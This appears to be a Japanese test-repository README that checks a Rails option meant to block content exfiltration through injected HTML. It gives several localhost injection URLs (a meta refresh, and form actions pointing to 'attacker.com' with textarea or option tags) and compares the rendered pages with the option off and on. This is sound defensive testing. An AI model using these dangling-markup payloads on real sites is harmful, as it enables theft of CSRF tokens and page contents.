# rails-content_exfiltration_prevention_helper-test

https://github.com/rails/rails/commit/cb5765a12751ca03866a89cf19fefcbc2d93a8ea で追加されたオプションconfig.action_view.prepend_content_exfiltration_preventionの動きを確かめる

## 前提
- Google Chrome 104.0.5112.102（Official Build）（64 bit）

## `<meta http-equiv="refresh" content='0;URL=https://attacker.com?`

http://localhost:3000/?xss1=%3Cmeta%20http-equiv=%22refresh%22%20content=%22100;URL=https://www.example.com%22%3E

### config.action_view.prepend_content_exfiltration_prevention = false

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="2L1QNvV7qZ49PqMpLYWU9v_eSsnLvSnFg-R4EKE5D8mvRr9TfVIoi856MiVFc7P88EGvKXE_FZbLxRaxXWLWYg" />
    
    <meta http-equiv="refresh" content="100
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    

<form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="iZZQ6d9uncRnDqe7Oi66KMlW9z6ULCv4vuhxcK4iRfQvMzSW-eEnMTxDqtx3yR6FSKbcNMXeWnpgGJ8KZ7-wKg" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### config.action_view.prepend_content_exfiltration_prevention = true

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="B4Y1AN2k94FjNA6kkzwQdQQ4AedBDK3f6DLbWB6kxsFwfdplVY12lJBwn6j7yjd_C6fkB_uOkYygE7X54v8fag" />
    
    <meta http-equiv="refresh" content="100
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    

<!-- '"` --><!-- </textarea></xmp> --></option></form><form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="lGIPa1CH6H5u3zqbQa5_p87bt0gz7QboUyDi4Dwc2UUyx2sUdghSizWSN_wMSdsKTyucQmIfd2qN0Aya9YEsmw" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### 結果
metaタグの注入自体がうまくいかなかった

## `<form action="https://attacker.com"><textarea>`

http://localhost:3000/?xss2=%3Cform%20action=%22https://attacker.com%22%3E%3Ctextarea%3E

### config.action_view.prepend_content_exfiltration_prevention = false

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="hIiup9WGmY-1htYvee0KrBGoSyH2CSyTeeW808GZo2jzc0HCXa8YmkbCRyMRGy2mHjeuwUyLEMAxxNJyPcJ6ww" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com"><textarea>

<form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="sTdExXsjyA83Ro5xM0-2JtaEfo3OdGhJnO3eBCHY8VAXkiC6Xaxy-mwLgxZ-qBKLV3RVh5-GGctCHTB-6EUEjg" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### config.action_view.prepend_content_exfiltration_prevention = true

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="xBxWEieMnxNueM63V_e-ZcnOPWAB0pFuu2hHfsHYZ6Oz57l3r6UeBp08X7s_AZlvxlHYgLtQrT3zSSnfPYO-CA" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com"><textarea>

<!-- '"` --><!-- </textarea></xmp> --></option></form><form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="pu44feDtDKnN7sIktuElV9iieBZx1dQnLq-nmai07e0AS1wCxmK2XJajz0P7BoH6WVJTHCAnpaXwX0njYSkYMw" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### 結果
注入されたタグからの脱出に成功した。

## `<form action="https://attacker.com"><option>`

http://localhost:3000/?xss2=%3Cform%20action=%22https://attacker.com%22%3E%3Coption%3E

### config.action_view.prepend_content_exfiltration_prevention = false

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="EV6f3EQXIjftJa2zbjtaqeHj9nB6sGi0TH18-jSVvipmpXC5zD6jIh5hPL8GzX2j7nwTkMAyVOcEXBJbyM5ngQ" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com"><option>

<form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="TllraI3YtoblHv2bjzoHJnG1JRMo6FeHqVEM0o7uw4no_A8Xq1cMc75T8PzC3aOL8EUOGXkaJgV3oeKoR3M2Vw" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### config.action_view.prepend_content_exfiltration_prevention = true

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="4oOfVm-jsAlnlc6CdNUqOuBtBvXLlRaSejvuURA83pKVeHAz54oxHJTRX44cIw0w7_LjFXEXKsEyGoDw7GcHOQ" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com"><option>

<!-- '"` --><!-- </textarea></xmp> --></option></form><form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="75-k-wFQiAUyO5XbQ3fyReQ7DTr9nH0WLLalbCyBgBNJOsCEJ98y8Gl2mLwOkFboZcsmMKxuDJTyRksW5Rx1zQ" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### 結果

## `<form action="https://attacker.com">`

http://localhost:3000/?xss2=%3Cform%20action=%22https://attacker.com%22%3E

### config.action_view.prepend_content_exfiltration_prevention = false

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="K4OimzKx8AhaWoAiKmZ5p2h_flnIl97EInrDN0DNLXpceE3-uphxHakeES5CkF6tZ-CbuXIV4pdqW62WvJb00Q" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com">

<form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="A3dHZykFjephCUm9HV5Gqg1FPa7uJQAkGK2eAJD1MC6l0iMYD4o3HzpERNpQueIHjLUWpL_XcabGXXB6WWjF8A" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### config.action_view.prepend_content_exfiltration_prevention = true

```
<!DOCTYPE html>
<html>
  <head>
    <title>Myapp</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="YLl-hoKZtadYKgEsa13bCPxof9v2Acqyv3fsweC59r0XQpHjCrA0sqtukCADq_wC8_eaO0yD9uH3VoJgHOIvFg" />
    
    
    <link rel="stylesheet" href="/assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css" data-turbo-track="reload" />
  </head>

  <body>
    <form action="https://attacker.com">

<!-- '"` --><!-- </textarea></xmp> --></option></form><form class="button_to" method="post" action="http://www.example.com"><button type="submit">Hello</button><input type="hidden" name="authenticity_token" value="EEJ01BEcTjzlUuhJnFyqLkrsOW_EEYE32XwxeIhzCi-25xCrN5P0yb4f5S7Ruw6DyxwSZZXj8LUHjN8CQe7_8Q" autocomplete="off" /></form>

<h1>secret</h1>

  </body>
</html>
```

### 結果
注入されたタグからの脱出に成功した。
